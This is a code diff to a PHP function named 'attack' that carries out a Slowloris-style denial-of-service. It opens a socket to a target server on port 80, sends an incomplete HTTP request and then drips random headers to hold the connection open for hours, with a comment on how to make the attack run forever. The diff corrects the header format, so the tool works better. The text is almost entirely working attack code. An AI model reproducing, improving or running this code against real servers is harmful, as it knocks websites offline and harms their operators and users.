@@ -13,7 +13,7 @@ function attack($server, $host, $pause = 10, $maxExecutionTime = 36000, $pid = n
     $basicRequest .= "Keep-Alive: 900\r\n";
     $basicRequest .= "Content-Length: " . rand(1000, 100000) . "\r\n";
     $basicRequest .= "Accept: *.*\r\n";
-    $basicRequest .= "X-Identity " . rand(1, 10) . ": " . rand(1, 100000) . "\r\n";
+    $basicRequest .= "X-Identity-" . rand(1, 10) . ": " . rand(1, 100000) . "\r\n";
 
     if (!$sockId = fsockopen($server, 80, $errno, $errstr)) {
         output("Attacker can't start, connection error: " . $errstr, $pid);
@@ -31,7 +31,7 @@ function attack($server, $host, $pause = 10, $maxExecutionTime = 36000, $pid = n
     $startTime = time();
     //to make the attacker infinite just replace the following line with  while(true)
     while (time() < $startTime + $maxExecutionTime) {
-        $newHeader = "Y-Identity " . rand(1, 10) . ": " . rand(1, 100000) . "\r\n";
+        $newHeader = "Y-Identity-" . rand(1, 10) . ": " . rand(1, 100000) . "\r\n";
         if (fwrite($sockId, $newHeader)) {
             output("Header " . $newHeader . " sent, continue attack", $pid);
             sleep($pause);
